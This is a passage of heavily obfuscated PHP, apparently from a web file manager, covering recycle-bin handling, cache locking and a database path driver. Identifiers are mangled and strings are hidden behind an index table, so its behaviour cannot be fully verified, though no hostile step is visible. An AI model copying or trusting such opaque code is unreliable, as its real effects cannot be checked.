self::$cacheChildList[$«ğ½‚ô] = $°¾ş¬í°; foreach ($°¾ş¬í° as $—Ÿë†íÊ) { $«ğ½‚ô = $’Èì†ş[460] . $—Ÿë†íÊ[$’Èì†ş[402]]; self::$cacheSourceInfo[$«ğ½‚ô] = $—Ÿë†íÊ; } return $°¾ş¬í°; } public function fileNameAuto($œÖ ¬Ú“, $ÑŒ’ï†, $À¡¡öğ€ = REPEAT_RENAME, $úàÏŒ— = false) { $„ÕºÂŒÅ =& $_SERVER[ä¿÷‹µ±]; $¢áğ¾ı = get_path_ext($ÑŒ’ï†); $ÍñÉÜ¾¸ = $¢áğ¾ı ? basename($ÑŒ’ï†, $„ÕºÂŒÅ[10] . $¢áğ¾ı) . $„ÕºÂŒÅ[2159] . $¢áğ¾ı : $ÑŒ’ï† . $„ÕºÂŒÅ[384]; $¤Íæü¤¡ = array($„ÕºÂŒÅ[432] => $œÖ ¬Ú“, $„ÕºÂŒÅ[431] => 0, $„ÕºÂŒÅ[32] => array($„ÕºÂŒÅ[383], $ÍñÉÜ¾¸)); $ÄÒöîô = $this->field($„ÕºÂŒÅ[32])->where($¤Íæü¤¡)->select(); $ÇÏ¹µÒÚ = array_to_keyvalue($ÄÒöîô, $„ÕºÂŒÅ[12], $„ÕºÂŒÅ[32]); return $this->fileNameAutoGet($ÇÏ¹µÒÚ, $ÑŒ’ï†, $À¡¡öğ€, $úàÏŒ—); } public function fileNameAutoGet($éêÑºˆ, $ññÀâæ, $Â¨ººä, $ŸØğƒ´Ç) { $û¾—À‘± =& $_SERVER[ä¿÷‹µ±]; if ($Â¨ººä == REPEAT_REPLACE || !$éêÑºˆ || !in_array_not_case($ññÀâæ, $éêÑºˆ) || $ŸØğƒ´Ç && $Â¨ººä != REPEAT_RENAME_FOLDER) { return $ññÀâæ; } if ($Â¨ººä == REPEAT_SKIP) { return !1; } $·¹ÛôÜ = $û¾—À‘±[10] . get_path_ext($ññÀâæ); $·¹ÛôÜ = $·¹ÛôÜ == $û¾—À‘±[10] || $ŸØğƒ´Ç ? $û¾—À‘±[12] : $·¹ÛôÜ; for ($¼ ü±À½ = 1; $¼ ü±À½ <= count($éêÑºˆ) + 1; $¼ ü±À½++) { $ÛÄ¯ª‘× = substr($ññÀâæ, 0, strlen($ññÀâæ) - strlen($·¹ÛôÜ)); $­Î­ñÑ” = $ÛÄ¯ª‘× . "\x28{$¼ ü±À½}\x29{$·¹ÛôÜ}"; if (!in_array_not_case($­Î­ñÑ”, $éêÑºˆ)) { return $­Î­ñÑ”; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\x65\x5f\x72\x65\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\151\155\x65", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\x66\x75\156\143\164\151\x6f\x6e")); public function listData($‚ àÏÀ¡ = false) { $×ŞÁŠáÃ =& $_SERVER[ä¿÷‹µ±]; $‚ àÏÀ¡ = $‚ àÏÀ¡ ? $‚ àÏÀ¡ : USER_ID; $æ†£„¶ = $this->where(array($×ŞÁŠáÃ[1669] => $‚ àÏÀ¡))->select(); return array_to_keyvalue($æ†£„¶, $×ŞÁŠáÃ[12], $×ŞÁŠáÃ[402]); } public function moveToRecycle($‹æĞ±¦Å) { $µ…âªÎé =& $_SERVER[ä¿÷‹µ±]; $œ£Ñ„ŒÉ = Model($µ…âªÎé[1349]); $šÖèıİë = $œ£Ñ„ŒÉ->sourceInfo($‹æĞ±¦Å); if (!$šÖèıİë || $šÖèıİë[$µ…âªÎé[431]] == $µ…âªÎé[88]) { return; } $‰í»ÊàÖ = array($µ…âªÎé[417] => $‹æĞ±¦Å, $µ…âªÎé[1669] => USER_ID, $µ…âªÎé[586] => $šÖèıİë[$µ…âªÎé[411]], $µ…âªÎé[587] => $šÖèıİë[$µ…âªÎé[505]], $µ…âªÎé[590] => $šÖèıİë[$µ…âªÎé[521]]); $this->add($‰í»ÊàÖ); $this->recycleMove($‹æĞ±¦Å, 1); if ($šÖèıİë[$µ…âªÎé[410]] == $µ…âªÎé[88]) { $ƒóÑõ×Õ = array($µ…âªÎé[590] => array($µ…âªÎé[550], $šÖèıİë[$µ…âªÎé[521]] . $‹æĞ±¦Å . $µ…âªÎé[551])); $œ£Ñ„ŒÉ->where($ƒóÑõ×Õ)->setField($µ…âªÎé[431], 1); } } public function clear() { $this->remove(!1); } public function remove($Åì¿Èº = false, $ÑİÇÓ‚Ö = false) { $¡äï…€Â =& $_SERVER[ä¿÷‹µ±]; $ÑİÇÓ‚Ö = $ÑİÇÓ‚Ö ? $ÑİÇÓ‚Ö : USER_ID; $şÏñÔš = Model($¡äï…€Â[1349]); $Ñ…çæÆğ = $this->listData($ÑİÇÓ‚Ö); $Åì¿Èº = $Åì¿Èº === !1 ? !1 : $Åì¿Èº; $—ÛÜ¬µ¤ = array(); foreach ($Ñ…çæÆğ as $¤òëè•«) { if ($Åì¿Èº != !1 && !in_array($¤òëè•«, $Åì¿Èº)) { continue; } $“²´çéô = $şÏñÔš->sourceInfo($¤òëè•«); $şÏñÔš->remove($¤òëè•«, !1); $²ÓŸË¦• = $“²´çéô[$¡äï…€Â[411]] . $¡äï…€Â[11] . $“²´çéô[$¡äï…€Â[505]]; $—ÛÜ¬µ¤[$²ÓŸË¦•] = array($¡äï…€Â[586] => $“²´çéô[$¡äï…€Â[411]], $¡äï…€Â[505] => $“²´çéô[$¡äï…€Â[505]]); $this->where(array($¡äï…€Â[402] => $¤òëè•«))->delete(); } foreach ($—ÛÜ¬µ¤ as $½…¸º¶) { $şÏñÔš->targetSpaceUpdate($½…¸º¶[$¡äï…€Â[411]], $½…¸º¶[$¡äï…€Â[505]]); } } public function restore($—•·ØÀ‚ = false) { $øï™†¾ß = $this->listData(); $this->_restoreSource($øï™†¾ß, $—•·ØÀ‚); } public function removeUserAll($î£Íœç) { $this->remove(!1, $î£Íœç); } private function _restoreSource($½‚ƒñ®, $Æ‹óñïı) { $¥ˆ‚Â¬ƒ =& $_SERVER[ä¿÷‹µ±]; $ªÛ”Ô = Model($¥ˆ‚Â¬ƒ[1349]); $Æ‹óñïı = $Æ‹óñïı == !1 ? !1 : $Æ‹óñïı; if (!$½‚ƒñ®) { return !0; } $İ×¾¸Ş = array(); foreach ($½‚ƒñ® as $ê†½éùµ) { if ($Æ‹óñïı != !1 && !in_array($ê†½éùµ, $Æ‹óñïı)) { continue; } $ÈĞ…±İ½ = $ªÛ”Ô->sourceInfo($ê†½éùµ); $È¸Ûš¡¨ = $ªÛ”Ô->sourceInfo($ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[432]]); if ($È¸Ûš¡¨[$¥ˆ‚Â¬ƒ[431]] == $¥ˆ‚Â¬ƒ[88]) { continue; } $ªÛ”Ô->lockMoveStart($ê†½éùµ); $this->recycleMove($ê†½éùµ, 0); if ($ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[410]] == $¥ˆ‚Â¬ƒ[88]) { $Ë•Û˜¹ï = array($¥ˆ‚Â¬ƒ[590] => array($¥ˆ‚Â¬ƒ[550], $ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[521]] . $ê†½éùµ . $¥ˆ‚Â¬ƒ[551])); $ªÛ”Ô->where($Ë•Û˜¹ï)->setField($¥ˆ‚Â¬ƒ[431], 0); $this->restoreFolderChildren($ê†½éùµ, $½‚ƒñ®); } $this->where(array($¥ˆ‚Â¬ƒ[402] => $ê†½éùµ))->delete(); $ªÛ”Ô->folderSizeReset($ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[432]]); $İ×¾¸Ş[] = $ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[432]]; if ($ÈĞ…±İ½[$¥ˆ‚Â¬ƒ[410]] == $¥ˆ‚Â¬ƒ[88]) { $İ×¾¸Ş[] = $ê†½éùµ; } $ªÛ”Ô->lockMoveEnd($ê†½éùµ); } $ªÛ”Ô->updateModifyTime($İ×¾¸Ş); } private function restoreFolderChildren($’œÄüëŠ, $ÑÌË¥±ˆ) { $£İ¯Ó =& $_SERVER[ä¿÷‹µ±]; $µ¡ó“Ğ = Model($£İ¯Ó[1349]); $Ú¹·Ùûş = array($£İ¯Ó[402] => array($£İ¯Ó[7], array())); foreach ($ÑÌË¥±ˆ as $ëÙ»Ş) { if ($ëÙ»Ş == $’œÄüëŠ) { continue; } if (!$µ¡ó“Ğ->isParentOf($’œÄüëŠ, $ëÙ»Ş)) { continue; } $½æ‰ÔÉÍ = $µ¡ó“Ğ->sourceInfo($ëÙ»Ş); if ($½æ‰ÔÉÍ[$£İ¯Ó[410]] == $£İ¯Ó[88]) { $Ú¹·Ùûş[] = array($£İ¯Ó[590] => array($£İ¯Ó[550], $½æ‰ÔÉÍ[$£İ¯Ó[521]] . $ëÙ»Ş . $£İ¯Ó[551])); } else { $Ú¹·Ùûş[$£İ¯Ó[402]][1][] = $ëÙ»Ş; } } if (!$Ú¹·Ùûş[$£İ¯Ó[402]][1]) { unset($Ú¹·Ùûş[$£İ¯Ó[402]]); } if (!$Ú¹·Ùûş) { return; } $Ú¹·Ùûş[$£İ¯Ó[402]][1] = array_unique($Ú¹·Ùûş[$£İ¯Ó[402]][1]); $Ú¹·Ùûş[$£İ¯Ó[1022]] = $£İ¯Ó[1948]; $µ¡ó“Ğ->where($Ú¹·Ùûş)->setField($£İ¯Ó[431], 1); } private function recycleMove($µòÚÍ¾, $şİÄÒÎ = 1) { $†„âƒÖ =& $_SERVER[ä¿÷‹µ±]; $’şâû¨… = Model($†„âƒÖ[1349]); $Ş“‘ì†í = Model($†„âƒÖ[2160]); $éàÈ‡… = array($†„âƒÖ[402] => $µòÚÍ¾); if ($şİÄÒÎ) { $’şâû¨…->where($éàÈ‡…)->setField($†„âƒÖ[431], 1); $Ş“‘ì†í->eventRecycle($µòÚÍ¾, $†„âƒÖ[2161]); } else { $—ØÓ¾ = $’şâû¨…->where($éàÈ‡…)->find(); $„Íº†šÂ = $—ØÓ¾[$†„âƒÖ[410]] == $†„âƒÖ[88]; $ë×øü±œ = $’şâû¨…->fileNameAuto($—ØÓ¾[$†„âƒÖ[432]], $—ØÓ¾[$†„âƒÖ[32]], REPEAT_RENAME_FOLDER, $„Íº†šÂ); if ($ë×øü±œ != $—ØÓ¾[$†„âƒÖ[32]]) { $’şâû¨…->rename($µòÚÍ¾, $ë×øü±œ); } $’şâû¨…->where($éàÈ‡…)->setField($†„âƒÖ[431], 0); $Ş“‘ì†í->eventRecycle($µòÚÍ¾, $†„âƒÖ[2162]); } } } goto eİÓ´¿â‡¬; CõÂòô„â¤: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ò—Ñ×Å =& $_SERVER[ä¿÷‹µ±]; if (self::$handle) { return self::$handle; } $©€‚£ü = $GLOBALS[$Ò—Ñ×Å[6]][$Ò—Ñ×Å[349]]; self::$timeout = $©€‚£ü[$Ò—Ñ×Å[859]] ? $©€‚£ü[$Ò—Ñ×Å[859]] : 10; $ÛÕ°×†¤ = _get($GLOBALS[$Ò—Ñ×Å[6]], $Ò—Ñ×Å[860]); $òÎ»ö¨ = $©€‚£ü[$Ò—Ñ×Å[846]] ? $©€‚£ü[$Ò—Ñ×Å[846]] : $Ò—Ñ×Å[199]; if ($òÎ»ö¨ == $Ò—Ñ×Å[21] && $ÛÕ°×†¤ == $Ò—Ñ×Å[13]) { $òÎ»ö¨ = $Ò—Ñ×Å[199]; } switch ($òÎ»ö¨) { case $Ò—Ñ×Å[849]: self::$handle = new CacheLockRedis(); break; case $Ò—Ñ×Å[850]: self::$handle = new CacheLockMemcached(); break; case $Ò—Ñ×Å[21]: self::$handle = new CacheLockDatabase(); break; case $Ò—Ñ×Å[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ò—Ñ×Å[861], $Ò—Ñ×Å[862]); } return self::$handle; } private static function key($§º„¶Åî) { return $_SERVER[ä¿÷‹µ±][863] . Cache::key($§º„¶Åî); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ãä•à¡¦ = '') { self::$errorMsg = $ãä•à¡¦; } public static function lockGlobal($½È¼‰¶ø, $Ú¶ã–©Ğ) { return self::lock($½È¼‰¶ø, $Ú¶ã–©Ğ, !0); } public static function lock($ˆ•¶™×, $¶Û©ØÇå = false, $¢˜ûÒÑ€ = false) { $Øİ™ª£ =& $_SERVER[ä¿÷‹µ±]; $ı£«ÈØ€ = self::init(); $¼‚Şäşñ = self::key($ˆ•¶™×); $¶Û©ØÇå = $¶Û©ØÇå ? $¶Û©ØÇå : self::$timeout; $Ù°ÜÂä = $ı£«ÈØ€->lock($¼‚Şäşñ, $¶Û©ØÇå); $áßıû¥ = timeFloat(); if (!$Ù°ÜÂä) { $«‚º‚µ = "\154\x6f\143\153\x20\145\162\162\157\x72\x3b\153\x65\x79\75{$ˆ•¶™×}\73\164\x69\155\x65\75{$¶Û©ØÇå}\73" . self::$errorMsg . $Øİ™ª£[71] . get_caller_msg(); $Åƒ‚Ø°ò = LNG($Øİ™ª£[864]) . "\x28{$¶Û©ØÇå}\x73\51\56" . LNG($Øİ™ª£[865]); $Åƒ‚Ø°ò .= $Øİ™ª£[866]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Åƒ‚Ø°ò = $Åƒ‚Ø°ò . $Øİ™ª£[867] . self::$errorMsg; } write_log($«‚º‚µ, $Øİ™ª£[862]); show_json($Åƒ‚Ø°ò, !1); } if (!$¢˜ûÒÑ€) { self::$lockItem[$¼‚Şäşñ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $”¶áœ´ = number_format(timeFloat() - $áßıû¥, 3); write_log($Øİ™ª£[868] . $ˆ•¶™× . $Øİ™ª£[869] . $”¶áœ´, $Øİ™ª£[862]); } return $Ù°ÜÂä; } public static function lockGet($ØãæŠ«—) { $êşôä„’ = self::key($ØãæŠ«—); if (self::$lockItem[$êşôä„’]) { return self::$lockItem[$êşôä„’]; } return self::init()->lockGet($êşôä„’); } public static function unlock($ıŞ§ã¥) { $…Æ´Íè =& $_SERVER[ä¿÷‹µ±]; $Ë÷Ù±Ï = self::key($ıŞ§ã¥); self::$lockItem[$Ë÷Ù±Ï] = null; self::init()->unlock($Ë÷Ù±Ï); if (GLOBAL_DEBUG_LOG_ALL) { write_log($…Æ´Íè[870] . $ıŞ§ã¥, $…Æ´Íè[862]); } return; } public static function unlockRuntime() { $İò¬·ò =& $_SERVER[ä¿÷‹µ±]; $°ÕŸˆ™é = self::init(); $´¯‰ßêØ = !1; foreach (self::$lockItem as $š¬µÑË => $Üşõúñ) { if (!$Üşõúñ) { continue; } $°ÕŸˆ™é->unlock($š¬µÑË); if (!$´¯‰ßêØ) { $´¯‰ßêØ = !0; write_log($İò¬·ò[871] . $š¬µÑË . $İò¬·ò[71] . get_caller_msg(), $İò¬·ò[862]); continue; } write_log($İò¬·ò[871] . $š¬µÑË, $İò¬·ò[862]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÙĞÅ½¤Ï = number_format(timeFloat() - TIME_FLOAT, 3); write_log($İò¬·ò[872] . $ÙĞÅ½¤Ï . $İò¬·ò[873] . ACTION, $İò¬·ò[862]); } } public static function fileLock($¿ùÓû¼Ì) { $öÅ…¸÷Í =& $_SERVER[ä¿÷‹µ±]; if (!$GLOBALS[$öÅ…¸÷Í[874]]) { $GLOBALS[$öÅ…¸÷Í[874]] = array(); } $GLOBALS[$öÅ…¸÷Í[874]][$¿ùÓû¼Ì] = !1; $»ØÎĞ = fopen(DATA_PATH . $¿ùÓû¼Ì . $öÅ…¸÷Í[875], $öÅ…¸÷Í[876]); if (!$»ØÎĞ) { return !1; } $GLOBALS[$öÅ…¸÷Í[874]][$¿ùÓû¼Ì] = $»ØÎĞ; if (flock($»ØÎĞ, LOCK_EX)) { return !0; } self::unlock($¿ùÓû¼Ì); show_json($öÅ…¸÷Í[877], !1); return !1; } public static function fileUnlock($•§ƒ‡…) { $ˆÑÔèêÙ =& $_SERVER[ä¿÷‹µ±]; $›™Ç¡÷Ô = $GLOBALS[$ˆÑÔèêÙ[874]][$•§ƒ‡…]; if (!$›™Ç¡÷Ô) { return; } $GLOBALS[$ˆÑÔèêÙ[874]][$•§ƒ‡…] = !1; flock($›™Ç¡÷Ô, LOCK_UN); fclose($›™Ç¡÷Ô); } public static function fileUnlockAll() { $Ğéù¤Û =& $_SERVER[ä¿÷‹µ±]; if (!$GLOBALS[$Ğéù¤Û[874]]) { return; } foreach ($GLOBALS[$Ğéù¤Û[874]] as $ÚŞÁ¨²› => $»­©Ïëì) { if (!$»­©Ïëì) { continue; } $GLOBALS[$Ğéù¤Û[874]][$ÚŞÁ¨²›] = !1; flock($»­©Ïëì, LOCK_UN); fclose($»­©Ïëì); } $GLOBALS[$Ğéù¤Û[874]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¡±ÇÍßÂ =& $_SERVER[ä¿÷‹µ±]; $Ë·×ƒ‘ƒ = $GLOBALS[$¡±ÇÍßÂ[6]][$¡±ÇÍßÂ[349]]; self::$cachePath = $Ë·×ƒ‘ƒ[$¡±ÇÍßÂ[199]][$¡±ÇÍßÂ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($îšªæá­, $­’ÍÏò’ = 0) { $ûğÑÒÄ =& $_SERVER[ä¿÷‹µ±]; $â‚Šø¹ = microtime(!0); $Ê•«üÁæ = $â‚Šø¹ + $­’ÍÏò’ + 0.0001; $äÑ…éìš = rtrim(self::$cachePath, $ûğÑÒÄ[8]) . $ûğÑÒÄ[878] . md5($îšªæá­) . $ûğÑÒÄ[875]; if (file_exists($äÑ…éìš) && filemtime($äÑ…éìš) && filemtime($äÑ…éìš) < time() - 10) { @unlink($äÑ…éìš); } do { if (file_exists($äÑ…éìš)) { cacheLockWait(); continue; } $¾ËÜûĞ€ = fopen($äÑ…éìš, $ûğÑÒÄ[879]); if (!$¾ËÜûĞ€) { return !1; } $ö—Í‡È = flock($¾ËÜûĞ€, LOCK_EX | LOCK_NB); self::$caches[$îšªæá­] = array($ûğÑÒÄ[880] => $¾ËÜûĞ€, $ûğÑÒÄ[199] => $äÑ…éìš); fwrite($¾ËÜûĞ€, $Ê•«üÁæ); clearstatcache(); if ($¾ËÜûĞ€ && $ö—Í‡È) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ê•«üÁæ); $this->unlock($îšªæá­); return !1; } public function lockGet($“¶°¸ñ) { $¼€Êéè =& $_SERVER[ä¿÷‹µ±]; $–õ£ó² = rtrim(self::$cachePath, $¼€Êéè[8]) . $¼€Êéè[878] . md5($“¶°¸ñ) . $¼€Êéè[875]; return file_exists($–õ£ó²); } public function unlock($È˜É‘Ğ‘) { $ş”‚™¾ë =& $_SERVER[ä¿÷‹µ±]; $Ê¶¬Øù = self::$caches[$È˜É‘Ğ‘]; if (!$Ê¶¬Øù) { return; } @flock($Ê¶¬Øù[$ş”‚™¾ë[880]], LOCK_UN); @fclose($Ê¶¬Øù[$ş”‚™¾ë[880]]); @unlink($Ê¶¬Øù[$ş”‚™¾ë[199]]); unset(self::$caches[$È˜É‘Ğ‘]); } } goto Cóƒ¥„÷Í; D‰ºˆ¾Š¢º: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($û£æÒËŞ) { $this->pathParse = $û£æÒËŞ; $this->model = Model($_SERVER[ä¿÷‹µ±][1349]); } public function getPath($ûËÛõœĞ) { return trim($ûËÛõœĞ, $_SERVER[ä¿÷‹µ±][8]); } public function pathFather($ºËå÷ôú) { $ç¹‡¬ğÑ = $this->parse($ºËå÷ôú); $ç¹‡¬ğÑ = $this->infoSimple($ºËå÷ôú); return $ç¹‡¬ğÑ ? $ç¹‡¬ğÑ[$_SERVER[ä¿÷‹µ±][432]] : !1; } public function pathThis($¨£±ã§) { $æ”Üí× = $this->infoSimple($¨£±ã§); return $æ”Üí× ? $æ”Üí×[$_SERVER[ä¿÷‹µ±][32]] : !1; } public function getPathOuter($ûÇ¶öá¦) { if (!$ûÇ¶öá¦) { return $ûÇ¶öá¦; } $™æÆë™ó = $this->parse($ûÇ¶öá¦); return KodIO::make($™æÆë™ó[$_SERVER[ä¿÷‹µ±][399]]); } public function copyFolderFromIO($ Œ‡·•ù, $”ªÃõ×, $ÏÌí»‡, $Ä•¨¡©×, $ªÈŸİşÖ) { $÷í˜÷»÷ = $this->model->copyFolderFromIO($ Œ‡·•ù, $”ªÃõ×, $ÏÌí»‡, $Ä•¨¡©×, $ªÈŸİşÖ); return KodIO::make($÷í˜÷»÷); } public function isParentOf($óÀâÖ­, $¿İ’ÅÂÉ) { return $this->model->isParentOf($óÀâÖ­, $¿İ’ÅÂÉ); } public function mkfile($‘àÁì¿Ü, $Ëò¡ì©× = '', $Ô›ş¸ğ = REPEAT_RENAME) { $±üè„øé =& $_SERVER[ä¿÷‹µ±]; $ó²Ò»ƒ = $this->parse($‘àÁì¿Ü); $‘àÁì¿Ü = $ó²Ò»ƒ[$±üè„øé[399]]; for ($ å¶šˆÍ = 0; $ å¶šˆÍ < count($ó²Ò»ƒ[$±üè„øé[1350]]); $ å¶šˆÍ++) { $çä½ö°ú = $ó²Ò»ƒ[$±üè„øé[1350]][$ å¶šˆÍ]; if ($ å¶šˆÍ == count($ó²Ò»ƒ[$±üè„øé[1350]]) - 1) { $‘àÁì¿Ü = $this->model->mkfile($‘àÁì¿Ü, $çä½ö°ú, $Ëò¡ì©×, $Ô›ş¸ğ); break; } $‘àÁì¿Ü = $this->model->mkdir($‘àÁì¿Ü, $çä½ö°ú, REPEAT_SKIP); } return $this->getPathOuter($‘àÁì¿Ü); } public function mkdir($Úæ™†ßÎ, $µ³¸ç„ˆ = REPEAT_SKIP) { $«ÇİÈ»Æ =& $_SERVER[ä¿÷‹µ±]; $·˜ÇÜª = $this->parse($Úæ™†ßÎ); $Úæ™†ßÎ = $·˜ÇÜª[$«ÇİÈ»Æ[399]]; for ($öæëé­ˆ = 0; $öæëé­ˆ < count($·˜ÇÜª[$«ÇİÈ»Æ[1350]]); $öæëé­ˆ++) { $À–İ¸Õ = $·˜ÇÜª[$«ÇİÈ»Æ[1350]][$öæëé­ˆ]; $Úæ™†ßÎ = $this->model->mkdir($Úæ™†ßÎ, $À–İ¸Õ, $µ³¸ç„ˆ); } return $this->getPathOuter($Úæ™†ßÎ); } public function copyFile($‰ˆ¡æª•, $ÃÒÉ¦Û¶, $¡õíå¸ç = REPEAT_REPLACE) { $Ÿ¢´È¶à =& $_SERVER[ä¿÷‹µ±]; $âùßİ  = $this->parse($ÃÒÉ¦Û¶); $º«ìÀÁ‘ = $this->model->copy($‰ˆ¡æª•, $âùßİ [$Ÿ¢´È¶à[399]], $¡õíå¸ç, $âùßİ [$Ÿ¢´È¶à[84]]); return $º«ìÀÁ‘ ? $this->getPathOuter($º«ìÀÁ‘) : !1; } public function moveFile($ÆüÅ‹ú·, $¯—ŠïÙ¹, $êï–¯Ãš = REPEAT_REPLACE) { $’‘ØêÜ· =& $_SERVER[ä¿÷‹µ±]; $ìÎœâºÁ = $this->parse($¯—ŠïÙ¹); $´ÇĞœ„° = $this->model->move($ÆüÅ‹ú·, $ìÎœâºÁ[$’‘ØêÜ·[399]], $êï–¯Ãš, $ìÎœâºÁ[$’‘ØêÜ·[84]]); return $´ÇĞœ„° ? $this->getPathOuter($´ÇĞœ„°) : !1; } public function copy($ûø©ûÙˆ, $ìÀÉÛ›É, $€×ˆğå = REPEAT_REPLACE, $Î…ÀÔä† = false) { $Šş»½İ = $this->parse($ìÀÉÛ›É); $Ê¥ÃÏøƒ = $this->model->copy($ûø©ûÙˆ, $Šş»½İ[$_SERVER[ä¿÷‹µ±][399]], $€×ˆğå, $Î…ÀÔä†); return $Ê¥ÃÏøƒ ? $this->getPathOuter($Ê¥ÃÏøƒ) : !1; } public function moveSameAllow() { } public function move($¤“Ä´‰ª, $Øå‚ÏïÇ, $–øó‹óß = REPEAT_REPLACE, $İ¯†ïÒ´ = false) { $Ë‘Æš®‡ = $this->parse($Øå‚ÏïÇ); $ğ¡í¥È‰ = $this->model->move($¤“Ä´‰ª, $Ë‘Æš®‡[$_SERVER[ä¿÷‹µ±][399]], $–øó‹óß, $İ¯†ïÒ´); return $ğ¡í¥È‰ ? $this->getPathOuter($ğ¡í¥È‰) : !1; } public function remove($¿ìØ ½, $îîÁÙ„” = true) { return $this->model->remove($¿ìØ ½, $îîÁÙ„”); } public function rename($Â‰Ğ‹ÔÃ, $‚šÙõî) { $Êã‚Êåê = $this->model->rename($Â‰Ğ‹ÔÃ, $‚šÙõî); return $Êã‚Êåê ? $this->getPathOuter($Â‰Ğ‹ÔÃ) : $Êã‚Êåê; } public function size($ÈÌáÁá) { $À°ĞÑ†‡ = $this->infoSimple($ÈÌáÁá); return $À°ĞÑ†‡ ? $À°ĞÑ†‡[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function infoSimple($ÊÛ¿Ù´) { return $this->model->sourceInfo($ÊÛ¿Ù´); } public function info($¤œç›–¡) { return $this->infoParse($¤œç›–¡); } public function infoAuth($®¤— öÅ) { return $this->infoParse($®¤— öÅ, !1, !0); } public function infoWithChildren($ìß¡¡¦¿) { return $this->infoParse($ìß¡¡¦¿, !0); } protected function infoParse($£¿ÒÏ€, $¾óÇëÜÇ = false, $öœ¢î¬‰ = false) { if (!$¾óÇëÜÇ) { return $this->model->pathInfo($£¿ÒÏ€, $öœ¢î¬‰); } return $this->model->pathInfoMore($£¿ÒÏ€); } public function infoFull($ï±´°ı‘) { $×¾¶Íó =& $_SERVER[ä¿÷‹µ±]; $üıÛ“à“ = explode($×¾¶Íó[8], $ï±´°ı‘); $Íèó±µ× = implode($×¾¶Íó[8], array_splice($üıÛ“à“, 1)); return $this->model->pathInfoByPath($üıÛ“à“[0], $Íèó±µ×); } public function hashSimple($·¡öË‰¨) { $£”–•¦Â =& $_SERVER[ä¿÷‹µ±]; $ºğìõò = $this->infoWithChildren($·¡öË‰¨); return $ºğìõò[$£”–•¦Â[170]][$£”–•¦Â[177]]; } public function hashMd5($¬ÔÅÔæŞ) { $¼ô›÷Ñ =& $_SERVER[ä¿÷‹µ±]; $ëÄµÍŸ = $this->infoWithChildren($¬ÔÅÔæŞ); return $ëÄµÍŸ[$¼ô›÷Ñ[170]][$¼ô›÷Ñ[176]]; } public function exist($ä‘ôİÎù) { $Ğ¬ºã¤£ =& $_SERVER[ä¿÷‹µ±]; $œÜòéƒ = $this->parse($ä‘ôİÎù); if (!$œÜòéƒ[$Ğ¬ºã¤£[84]]) { return $this->isFile($ä‘ôİÎù) || $this->isFolder($ä‘ôİÎù); } $øıÀøĞœ = array($Ğ¬ºã¤£[401] => $œÜòéƒ[$Ğ¬ºã¤£[399]], $Ğ¬ºã¤£[32] => $œÜòéƒ[$Ğ¬ºã¤£[84]]); $…¦í”Ö¿ = $this->model->where($øıÀøĞœ)->find(); return $…¦í”Ö¿ ? !0 : !1; } public function isFile($üúşğå«) { $¡ş›ÇÃÉ =& $_SERVER[ä¿÷‹µ±]; $ş•ƒÂ¾ş = $this->infoSimple($üúşğå«); return $ş•ƒÂ¾ş && $ş•ƒÂ¾ş[$¡ş›ÇÃÉ[410]] == $¡ş›ÇÃÉ[88] ? !1 : !0; } public function isFolder($†Ó¤£ÊŒ) { $ÆåÆäÕä =& $_SERVER[ä¿÷‹µ±]; $‰§ÖüÆ¦ = $this->infoSimple($†Ó¤£ÊŒ); return $‰§ÖüÆ¦ && $‰§ÖüÆ¦[$ÆåÆäÕä[410]] == $ÆåÆäÕä[88] ? !0 : !1; } public function listPath($§¨˜½¾æ, $éÙÌ¿±œ = false) { $¿±®¬¡Æ =& $_SERVER[ä¿÷‹µ±]; if ($§¨˜½¾æ == $¿±®¬¡Æ[12]) { return !1; } $Öõ‰ì©Ò = array($¿±®¬¡Æ[401] => $§¨˜½¾æ); if ($éÙÌ¿±œ) { return $this->model->listSource($Öõ‰ì©Ò, -1); } return $this->model->listSource($Öõ‰ì©Ò); } public function has($„«Õ‚Ñ¸, $‹Ÿí§É = false, $¨· —Šø = null) { $ÆŒÕ×¿’ =& $_SERVER[ä¿÷‹µ±]; $«“İô¦Â = $this->infoWithChildren($„«Õ‚Ñ¸); if ($‹Ÿí§É) { return array($ÆŒÕ×¿’[208] => $«“İô¦Â[$ÆŒÕ×¿’[208]], $ÆŒÕ×¿’[207] => $«“İô¦Â[$ÆŒÕ×¿’[207]]); } return $¨· —Šø ? $«“İô¦Â[$ÆŒÕ×¿’[208]] : $«“İô¦Â[$ÆŒÕ×¿’[207]]; } public function listAll($é¯Ùö™¥) { $€Œ÷˜ÈØ = IO::info($this->pathParse[$_SERVER[ä¿÷‹µ±][84]]); if (!$€Œ÷˜ÈØ) { return array(); } return $this->model->listAll($é¯Ùö™¥); } public function getContent($¡ôœúÌ‰) { return $this->model->getContent($¡ôœúÌ‰); } public function setContent($¬¯õÉÄ×, $Ì§–ì›› = '') { return $this->model->setContent($¬¯õÉÄ×, $Ì§–ì››); } public function fileSubstr($ÆÏíğâ¥, $à»ë‹ìæ, $ëÓÕÂİ¸) { return $this->model->fileSubstr($ÆÏíğâ¥, $à»ë‹ìæ, $ëÓÕÂİ¸); } public function download($¤Îã³æ…, $™¹ëúçè = '') { $şÊ¿œ‰ı = get_path_father($™¹ëúçè); $ÂÁı•£€ = get_path_this($™¹ëúçè); $âê¡»ıİ = $this->model->fileInfoGet($¤Îã³æ…); $Ø™ûÔêñ = 